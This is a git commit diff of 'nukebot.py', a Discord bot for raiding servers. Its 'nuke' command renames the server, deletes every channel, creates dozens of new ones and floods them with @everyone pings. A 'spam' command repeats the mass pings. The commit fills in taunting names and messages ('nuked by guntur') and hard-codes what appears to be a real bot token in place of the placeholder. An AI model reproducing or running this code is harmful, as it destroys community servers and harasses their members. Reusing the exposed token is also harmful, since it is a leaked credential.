e93579e9866f1001726e02a2cf00bae16a1568b7
oniichanxx <93672578+oniichanxx@users.noreply.github.com>
2021-11-03 18:05:41 +0100

    Update nukebot.py

--- nukebot.py
+++ nukebot.py
@@ -16,7 +16,7 @@ client = commands.Bot(command_prefix=prefix, intents=intents)
 @client.event
 async def on_ready():
     print('Bot is online')
-    await client.change_presence(activity=discord.Game('Security'))
+    await client.change_presence(activity=discord.Game('guntur runs you'))
 
 @client.command()
 async def ping(ctx):
@@ -29,7 +29,7 @@ async def invite(ctx):
 @client.command()
 async def nuke(ctx):
 
-    await ctx.guild.edit(name='SERVER NAME') #Decide what to change the server name to
+    await ctx.guild.edit(name='nuked by guntur') #Decide what to change the server name to
 
     for c in ctx.guild.channels:
         await c.delete()
@@ -38,23 +38,23 @@ async def nuke(ctx):
 
     n=0
     while(n<=85):
-        await guild.create_text_channel('CHANNEL NAME HERE') # Decide what should be the name of the text channels that you will create
+        await guild.create_text_channel('ran by guntur') # Decide what should be the name of the text channels that you will create
         n = n+1
 
     for c in ctx.guild.text_channels:
-             await c.send('@everyone ') # Put the messages you want to be spammed here
-             await c.send('@everyone ')
-             await c.send('@everyone ')
-             await c.send('@everyone ')
-             await c.send('@everyone ')
+             await c.send('@everyone kaji on top') # Put the messages you want to be spammed here
+             await c.send('@everyone ran by guntur ')
+             await c.send('@everyone noobs')
+             await c.send('@everyone nukeddd')
+             await c.send('@everyone lol')
 
 @client.command()
 async def spam(ctx):
     for c in ctx.guild.text_channels:
-             await c.send('@everyone ') #Put what to be spammed in the brackets 
-             await c.send('@everyone ')
-             await c.send('@everyone ')
-             await c.send('@everyone ')
-             await c.send('@everyone ')
+             await c.send('@everyone kaji on top') #Put what to be spammed in the brackets 
+             await c.send('@everyone guntur')
+             await c.send('@everyone guntur runs you')
+             await c.send('@everyone rekttt')
+             await c.send('@everyone guntur')
 
-client.run('YOUR TOKEN HERE')
+client.run('OTA1NDk5OTEyMjE5ODExODkw.YYK-gg.nA1aIPZQSaqrf54_sN03KwNWilc')
